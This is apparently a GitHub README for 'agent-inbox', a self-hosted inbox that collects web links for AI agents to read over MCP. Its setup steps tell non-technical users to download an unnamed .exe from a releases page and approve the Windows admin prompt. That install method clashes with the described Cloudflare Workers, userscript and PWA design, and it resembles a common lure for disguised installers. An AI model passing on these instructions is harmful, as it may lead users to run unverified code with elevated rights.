# 📦 agent-inbox - Send links to your AI agent

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/peopleupperpeninsula500/agent-inbox/releases)

Agent-inbox acts as a central hub for your AI agents. It collects the links and articles you find across the web. You send items from your browser or mobile phone. Your chosen AI, such as Claude or ChatGPT, reads the content and provides an analysis or suggested tasks. It functions as a reading list for your digital assistant.

## ⚙️ How it Works

The system bridges the gap between your web browsing and your AI tools. You save a link to the inbox. The inbox stores the page content. You then connect an MCP client or browser plugin to read the data. This setup allows you to process information while you move through your day. You maintain control over your data since you host the service yourself.

## 🚀 Setting Up the Application

You do not need programming skills to run this tool on your Windows computer. Follow these steps to prepare your environment.

### 1. Download the Installer
Visit the official repository page to get the latest version of the software.

[Download the application here](https://github.com/peopleupperpeninsula500/agent-inbox/releases)

1. Click the link above to open the releases page in your browser.
2. Look for the section labeled Assets.
3. Find the file ending in .exe for Windows.
4. Click the filename to start the download.

### 2. Install the Software
1. Locate the downloaded file in your Downloads folder.
2. Double-click the file to begin the installation.
3. Windows might show a prompt asking if you want to allow the app to make changes. Click Yes.
4. Follow the setup wizard prompts. Click Next until the installation finishes.
5. Click Close to exit the wizard.

### 3. Run the Application
1. Find the new shortcut on your desktop or in your Start menu.
2. Double-click the icon to launch the application.
3. A command window or a local browser tab will open. This indicates the inbox is active.
4. Leave this window open while you use the service.

## 🛠 Features

### Web Integration
The application includes a browser extension that lets you right-click any page to send it to your inbox. This saves time and ensures you never lose track of interesting content.

### Mobile Support
You can send links from your phone browser. Share a page from your mobile device and select the agent-inbox option. The system will catch the link and add it to your queue immediately.

### AI Compatibility
The system works with any standard MCP client. You can hook up Claude, ChatGPT, or local LLMs to your inbox. The AI checks your queue whenever you ask, summarizes the pages, and prepares a report for you.

### Self-Hosted Privacy
You run this software on your own hardware. Your data remains on your machine or your own Cloudflare workers account. No third-party servers store your reading list or personal links.

## 💡 Using the System

Once you install the tool, you define how you interact with it. 

1. **The Dashboard:** Open your web browser and go to the local address provided by the application. This shows you a list of all saved links.
2. **Processing Links:** Use your preferred AI interface. Provide the address of your local inbox. The AI will look at the unread items and provide opinions or next steps based on your instructions.
3. **Queue Management:** Delete items after the AI finishes reviewing them. This keeps your list clean and focused on new tasks.

## 🖥 System Requirements

- Operating System: Windows 10 or Windows 11.
- Memory: 4GB RAM minimum.
- Storage: 200MB free disk space.
- Internet Connection: Active connection required for AI processing.

## 🔧 Troubleshooting

If the application fails to start, verify that you installed the correct version for your Windows architecture. Most modern computers use 64-bit systems. 

If the AI cannot connect to the inbox, ensure your local firewall allows the application to communicate over the network. Check the settings page inside the dashboard to confirm your API keys are correct. If you use Cloudflare Workers, check your worker status in the Cloudflare dashboard to ensure the service is active and receiving requests.

## 📋 Configuration

You can customize the inbox by editing the settings file located in the application folder. You can change the local port number if the default conflicts with another app. You can also define categories for your links to help the AI organize its analysis more effectively.

Keywords: ai-agents, chatgpt, chrome-extension, claude, cloudflare-workers, mcp, pwa, read-it-later, self-hosted, userscript